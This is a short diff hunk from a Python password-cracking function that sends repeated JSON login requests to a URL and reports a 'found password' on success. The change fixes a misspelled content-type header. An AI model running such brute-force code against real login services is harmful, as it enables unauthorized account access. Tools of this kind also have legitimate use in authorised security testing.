@@ -24,7 +24,7 @@ def crack(username, url, server):
 		jsonEncode = json.dumps(jsonRequest)
 
 		print("[-] Cracking with: " + password + " [-]")
-		header = { "contenst-type": "application/json" }
+		header = { "content-type": "application/json" }
 		response = requests.post(url, headers=header, data=jsonEncode)
 		if '{"code":0,' in response.text:
 			print("[+] Found password: " + password + " [+]")
